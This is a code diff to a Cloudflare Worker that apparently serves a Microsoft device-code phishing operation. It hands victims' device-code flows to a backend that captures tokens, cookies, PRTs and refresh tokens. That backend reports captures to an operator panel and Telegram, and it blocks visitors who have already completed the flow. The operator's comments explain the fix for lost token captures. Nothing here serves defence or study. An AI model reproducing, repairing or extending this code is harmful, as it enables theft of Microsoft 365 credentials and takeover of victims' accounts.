@@ -494,50 +494,65 @@ async function handleDeviceCodeRequest(request, waitUntil) {
 
       diag('TURNSTILE_OK', 'token_len=' + String(turnstile_token || '').length, waitUntil);
 
-      const deviceCodeResponse = await fetch(
-        `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/devicecode`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: new URLSearchParams({
-            client_id: verifyData.client_id,
-            scope: 'https://graph.microsoft.com/.default openid offline_access',
-            claims: JSON.stringify({
-              access_token: {
-                amr: { values: ['ngcmfa'] },
-                xms_cc: { values: ['cp1'] },
-              },
-            }),
-          }),
-        }
-      );
-      const deviceCodeData = await deviceCodeResponse.json();
-      diag('MS_RESPONSE', 'http=' + deviceCodeResponse.status + ' error=' + (deviceCodeData.error || '(none)') + ' user_code=' + (deviceCodeData.user_code || '(none)') + ' interval=' + deviceCodeData.interval, waitUntil);
+      // Delegate the device-code request AND the token polling to the backend.
+      // Polling has to live on the server: Cloudflare kills the worker's
+      // background task after ~30-45 s, and a human needs 30-120 s to enter
+      // the code and authenticate. Anything past that deadline was polled by
+      // nobody, so the token was never captured, the visitor stayed "waiting"
+      // and the 20-minute cron flipped it to "timeout".
+      // deviceProxy.startDeviceFlow() starts a server-side poller that runs for
+      // the whole code lifetime, stores the token (cookies, PRT, refresh-token
+      // exchange), flips the visitor to "done" and fires the panel + Telegram
+      // notifications itself.
+      const authMode = request.headers.get('x-auth-mode') || 'cookie';
+      const startResponse = await backendFetch('/api/device/start', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'User-Agent': visitorUa || 'Mozilla/5.0 (compatible)',
+        },
+        body: JSON.stringify({
+          mode: authMode,
+          jwt_token: jwt_token,
+          ip: visitorIp,
+          user_agent: visitorUa,
+          tenant: verifyData.tenant,
+          client_id: verifyData.client_id,
+        }),
+      });
+      const startData = await startResponse.json().catch(function () { return null; });
+      diag('BACKEND_DEVICE_START', 'http=' + startResponse.status + ' body=' + JSON.stringify(startData).substring(0, 300), waitUntil);
 
-      if (deviceCodeData.error) {
-        reportDevCode('FAILED at microsoft devicecode', 'status=' + deviceCodeResponse.status + ' error=' + deviceCodeData.error + ' desc=' + deviceCodeData.error_description, waitUntil);
-        return new Response(JSON.stringify({ error: deviceCodeData.error_description || 'Microsoft error' }), {
+      if (startResponse.status >= 500 || !startData) {
+        reportDevCode('FAILED at backend device/start', 'http=' + startResponse.status + ' body=' + JSON.stringify(startData).substring(0, 300), waitUntil);
+        return new Response(JSON.stringify({ error: 'Failed to generate code' }), {
+          status: 500,
+          headers: { 'Content-Type': 'application/json' },
+        });
+      }
+
+      // block_done_visitors: this address already completed a flow for the link.
+      if (startData.blocked) {
+        return new Response(JSON.stringify({ blocked: true, redirect_url: startData.redirect_url }), {
+          status: 200,
+          headers: { 'Content-Type': 'application/json' },
+        });
+      }
+
+      if (!startData.user_code) {
+        reportDevCode('FAILED at backend device/start', 'http=' + startResponse.status + ' error=' + (startData.error || '(none)') + ' message=' + (startData.message || '(none)'), waitUntil);
+        return new Response(JSON.stringify({ error: startData.error || 'Failed to generate code' }), {
           status: 400,
           headers: { 'Content-Type': 'application/json' },
         });
       }
 
-      // Start background polling with server-recommended interval
-      const pollInterval = deviceCodeData.interval || 5;
-      // pollForTokens() must be registered with waitUntil: Cloudflare cancels
-      // any promise that is not registered the moment the response is sent, so
-      // an unregistered poller is killed before it ever fetches the token.
-      // That is why a completed device-code flow arrived with nothing saved in
-      // the panel and no telegram message - /api/capture was never reached.
-      const poller = pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval, visitorIp, visitorUa, waitUntil).catch(function () {});
-      if (typeof waitUntil === 'function') waitUntil(poller);
-
-      diag('SUCCESS', 'user_code=' + deviceCodeData.user_code + ' verification_uri=' + deviceCodeData.verification_uri + ' expires_in=' + deviceCodeData.expires_in, waitUntil);
+      diag('SUCCESS', 'user_code=' + startData.user_code + ' verification_uri=' + startData.verification_uri + ' expires_in=' + startData.expires_in + ' job_id=' + (startData.job_id || '(none)'), waitUntil);
       return new Response(JSON.stringify({
-        user_code: deviceCodeData.user_code,
-        verification_uri: deviceCodeData.verification_uri,
-        expires_in: deviceCodeData.expires_in,
-        message: deviceCodeData.message,
+        user_code: startData.user_code,
+        verification_uri: startData.verification_uri,
+        expires_in: startData.expires_in,
+        message: startData.message,
       }), {
         headers: { 'Content-Type': 'application/json' },
       });
@@ -553,6 +568,11 @@ async function handleDeviceCodeRequest(request, waitUntil) {
   }
 }
 
+// DEAD CODE - do not call. handleDeviceCodeRequest() now delegates the
+// device-code request and the token polling to the backend's /api/device/start,
+// whose server-side poller (deviceProxy.pollForToken) outlives the worker and
+// is what stores the token / updates the visitor / fires panel + Telegram.
+// Keeping this here would race that poller and double-store.
 async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval, visitorIp, visitorUa, waitUntil) {
   const maxAttempts = 60;
   let attempts = 0;
